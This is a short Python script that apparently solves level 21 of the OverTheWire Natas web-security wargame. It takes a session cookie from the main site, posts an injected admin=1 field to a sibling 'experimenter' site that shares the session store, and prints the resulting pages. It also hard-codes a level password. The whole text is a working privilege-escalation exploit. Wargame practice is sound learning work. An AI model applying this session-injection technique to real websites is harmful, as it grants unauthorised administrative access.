import requests
from requests.auth import HTTPBasicAuth

url = 'http://natas21.natas.labs.overthewire.org/index.php?'
url_exp = 'http://natas21-experimenter.natas.labs.overthewire.org/index.php?debug=1'
auth = HTTPBasicAuth('natas21', 'IFekPyrQXftziDEsUr3x21sYuahypdgJ')

r = requests.get(url, auth=auth)
cookies = dict(PHPSESSID=r.cookies['PHPSESSID'])
data = dict(align='lol', fontsize='100%', bgcolor='yellow', submit='Update', admin='1')
r = requests.post(url_exp, data=data, cookies=cookies, auth=auth)
print r.content

r = requests.get(url, cookies=cookies, auth=auth)
print r.content